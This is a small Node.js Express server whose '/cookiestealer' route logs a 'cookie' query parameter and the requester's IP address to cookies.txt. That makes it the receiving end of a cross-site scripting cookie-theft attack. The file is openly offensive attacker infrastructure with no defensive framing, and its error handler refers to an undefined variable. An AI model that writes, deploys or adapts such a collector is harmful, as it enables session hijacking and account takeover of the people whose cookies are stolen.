const express = require("express");
const fs = require("fs");
const app = express();


app.get('/', (req, res) => {
  res.send('Hi, Your Website Is Alive. Congrats!');
});

app.get('/cookiestealer', (req,res) => {
  var data = req.query.cookie
  var ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
  dataToWrite = "IP: " + ip + "\nData: " +data + "\n"
  fs.appendFile('cookies.txt', dataToWrite, (error) => { 
    if (error) throw err; 
  })
  res.send("")
});

const listener = app.listen(80, () => {
  console.log("Your app is listening on port " + listener.address().port);
});  